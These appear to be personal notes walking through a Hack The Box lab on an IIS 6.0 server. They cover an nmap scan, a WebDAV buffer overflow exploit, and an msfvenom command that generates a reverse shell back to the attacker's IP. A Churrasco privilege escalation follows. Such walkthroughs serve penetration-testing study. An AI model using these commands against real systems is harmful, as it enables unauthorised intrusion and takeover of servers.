### Enumeration
- First, do the usual nmap scan : `nmap -A -p- -T4 -Pn 10.10.10.14` ![[Pasted image 20250911124618.png]]
- We can see a port 80, let's check it.![[Pasted image 20250911124844.png]]
- As usual, let's do directory busting to check![[Pasted image 20250911161846.png]]
- Back to nmap scan, since the web server used in port 80 is IIS httpd 6.0, we can look at some exploit with that version![[Pasted image 20250911132221.png]]
	- Here, we can focus on the WebDAV with the Remote Buffer Overflow. 
		- While real life cases might differ, in OSCP context, Remote Buffer Overflow vulnerability can be turned to RCE exploit, which is what we want
### Exploitation (Attempt 1)
- We can get the exploit script by `searchsploit -m windows/remote/41738.py`![[Pasted image 20250911133122.png]]
- This is the exploit, before testing it, we need to generate a shellcode that is able to generate a shell on target machine to connect to us, and change the IP address. Let's do that![[Pasted image 20250911133242.png]]
	- Generate the shellcode using msfvenom : `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f python -v shellcode` ![[Pasted image 20250911142944.png]]
	- Add it to the exploit and change the target of the exploit![[Pasted image 20250911142257.png]]
		- Just copy and paste, the `shellcode +=` will make it so the line append more bytes to the same shellcode variable
	- Well, this one failed.![[Pasted image 20250911144640.png]]
		- Let's try other version of this exploit

### Exploitation (Attempt 2)
- This script is from https://github.com/danigargu/explodingcan. It exploit the same vuln, we can try to use it
- Yeah, this one also did not work![[Pasted image 20250911174451.png]]
	- I try to troubleshoot it, but to no avail. It changed to this instead using a fix i found in the comment of the repo![[Pasted image 20250911174603.png]]
- Let's try another one

### Exploitation (Attempt 3)
- Finally, we are getting somewhere with this script![[Pasted image 20250915135610.png]]![[Pasted image 20250915135120.png]]
- It seems that the user.txt is locked for some reason?![[Pasted image 20250915140304.png]]
	- After checking on a guide, it seems that the intended path is to do priv esc to administrator. So, let's do that

### Privilege Escalation
- First, we need to find a place to that we are able to write to. ![[Pasted image 20250915141520.png]]
- With this new place that we can write into, we can import the system info over to our box and run Windows Exploit Suggester![[Pasted image 20250917162244.png]]![[Pasted image 20250917162307.png]]![[Pasted image 20250917162329.png]]
- I tried some of it, it did not work, so let's do another enum for priv esc. Let's check for privilege in whoami /priv![[Pasted image 20250917163433.png]]
- The SeImpersonatePrivilige being enabled may hinted on some possible vector like juicy, lonely, rotten, and else. But since this is an old boox, maybe better to start with churassco![[Pasted image 20250917165816.png]]
- Run it                                                       ![[Pasted image 20250917171334.png]]![[Pasted image 20250917171313.png]]
- Lets get the user.txt and the admin.txt![[Pasted image 20250917171452.png]]
### FootNote

Strategy, Trial and Error

Going from this list to a shell is often a lot of googling, guessing, and trial and error. I’ll reduce the list with the following criteria:

- Not interested in Metasploit.
- Looking (at least to start) for exploits against Windows itself, not IE or MsSQL.
- I like to start with ones that I can find a pre-compiled exe. That’s not a great idea for real work, but easiest for HTB / OSCP.
- The exe has to create a new process that calls back or can return a shell in the same window. You’ll find a lot of these have exes that open a new shell as SYSTEM, which isn’t useful at all for me.

#### No Success

I tried a lot off this list, but none with success. This is normal for this kind of thing. It’s frustrating, and normal. One tip I’d throw out for anyone doing OSCP - keep a list of exploits that have binaries that fit the descriptions above and where they work. I used to have one, but can’t find it anymore. Something like [this](https://mysecurityjournal.blogspot.com/p/client-side-attacks.html) is a really good start.